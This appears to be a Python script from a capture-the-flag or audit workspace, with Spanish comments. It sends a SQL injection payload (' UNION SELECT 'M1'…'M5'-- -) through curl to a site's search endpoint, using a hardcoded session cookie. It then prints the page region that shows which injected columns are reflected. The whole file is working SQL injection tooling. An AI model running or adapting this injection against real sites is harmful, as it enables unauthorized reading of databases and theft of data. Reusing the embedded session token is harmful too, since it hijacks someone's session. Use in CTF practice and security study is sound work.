#!/usr/bin/env python3
"""Identifica qué columnas se muestran y en qué orden."""
import re
import subprocess
import urllib.parse

COOKIE = "trama_session=Vgb10FPCRELz_F_vMBbmZuRHczUjV3V1DKFygYKh22mTBZdgeA-3Qsy5Sgd3RSKU"
BASE = "https://<host>"
W = "/mnt/c/Users/shapl/OneDrive - dipreca.cl/Agentes IA/AUDITORIA_IA_V2/ctf/feriapersa/work"


def get(q: str) -> str:
    url = f"{BASE}/buscar?q={urllib.parse.quote(q)}"
    r = subprocess.run(["curl", "-s", "-m", "20", "-b", COOKIE, url], capture_output=True, text=True)
    return r.stdout


q = "' UNION SELECT 'M1','M2','M3','M4','M5'-- -"
html = get(q)
open(f"{W}/union_marcadores.html", "w", encoding="utf-8").write(html)

# mostrar solo la zona de resultados
inicio = html.find('class="producto-card')
print(html[inicio-200:inicio+1800] if inicio > 0 else "sin tarjetas")
